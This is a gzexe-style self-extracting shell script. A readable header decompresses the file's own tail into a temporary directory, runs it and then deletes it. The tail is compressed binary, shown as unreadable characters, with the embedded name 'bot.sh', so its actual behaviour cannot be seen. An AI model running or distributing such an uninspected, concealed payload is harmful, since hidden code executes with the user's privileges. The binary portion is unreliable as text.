#!/bin/sh
skip=49

tab='	'
nl='
'
IFS=" $tab$nl"

umask=`umask`
umask 77

gztmpdir=
trap 'res=$?
  test -n "$gztmpdir" && rm -fr "$gztmpdir"
  (exit $res); exit $res
' 0 1 2 3 5 10 13 15

case $TMPDIR in
  / | /*/) ;;
  /*) TMPDIR=$TMPDIR/;;
  *) TMPDIR=/tmp/;;
esac
if type mktemp >/dev/null 2>&1; then
  gztmpdir=`mktemp -d "${TMPDIR}gztmpXXXXXXXXX"`
else
  gztmpdir=${TMPDIR}gztmp$$; mkdir $gztmpdir
fi || { (exit 127); exit 127; }

gztmp=$gztmpdir/$0
case $0 in
-* | */*'
') mkdir -p "$gztmp" && rm -r "$gztmp";;
*/*) gztmp=$gztmpdir/`basename "$0"`;;
esac || { (exit 127); exit 127; }

case `printf 'X\n' | tail -n +1 2>/dev/null` in
X) tail_n=-n;;
*) tail_n=;;
esac
if tail $tail_n +$skip <"$0" | gzip -cd > "$gztmp"; then
  umask $umask
  chmod 700 "$gztmp"
  (sleep 5; rm -fr "$gztmpdir") 2>/dev/null &
  "$gztmp" ${1+"$@"}; res=$?
else
  printf >&2 '%s\n' "Cannot decompress $0"
  (exit 127); res=127
fi; exit $res
�S4�gbot.sh �Y�n�6�ϧ8Q�f� ˮ�8�z�{�����Y�&A@I�MD���wۏ�ÞpO2R;v*yC�-ê�}xx���E=�0l6�ct������M<"�}hD�aX��A��>��$�3a�܂��7��ڈ��Ğp0$5'�7�["dĘF�;���\�F����~�ln��%I#F"�TP^ :���;�aS�7 �$@���%�N��ީ���!�q��`��t�ɝh�'\
"����XT�q o%�`D�t}hrm/�,���r>B�h��<�D`�ĥ�pf6a�(0���Ľ C���L�X�5l��!g��q$`�Xx��_#�]�,��@4�0h�w=��\a�=*HS�7G_�rb��cЉ��Q�}Y�M-j?�u���$���D�@�+K$�n�E�Ko$5מ����m��8���O���5C=/��H<"�����4LC��eb���](��i�q���},2�վ_�����ό|8�D�:M{�U�Y���8:.X�[�R,=�����<�#�U����oo�D��	����(>�k��?��KK-M�)�� �>Y����:r�������=� �s*�����Ґ�����U�dYu��f*L�,�+Ѹ��]����v�]�����+�ګ7�n�5l�Joi�9Ý���6v���S�v1~9$�dش[��=�/�

��,��ok���4�P�U+]��f���������z�yU��% ��{����ˋ�A��K��^����מ�*�S�f]u�/NN�U�_S�ގңQ��Mt�y0?��u�#��2�c�N� ;�Lf���-�
�%����6p"+�[SW�D�#���~X��`L8K����?4���lы]��}��^���sKe�A����V��P��Um�3.��f�EŖ�qJ��������!�a44��#�����ӻ3���;2���v@D����L�]Y��t)�4ud�vd�0k'Eu�cIn�^A|.��"c/�3.%���,%aٍ����?��UJ������r�'7��@g�����H^�!�`[np�7RZ|<��Б5�ov���� IoO8���1���[#Ou'�w���k��Nc��ǋ}
v� �O@�EC�9�����#=kL�����H�
�O=��V�RY�*HY
�V�JQV� �Hq��bTe�5�(��C�t��`�$���pTc�b��d*�D�W����t.�JI���*(�Ea��2��eC�����B2�U��ϔ�`+q�DN�N�V�Y&.�J�T�k���'�lq�jX.�G�Q���$�R��`UQ��MI�&�qeh�uP���W�S�uI�/�1��t�i��ʝ����ey����p��\~�x��|�:?/�z��?8�|����;�L����ޱ��`�P�����0W/��AF�̳��hsZr����&�ā��柎��  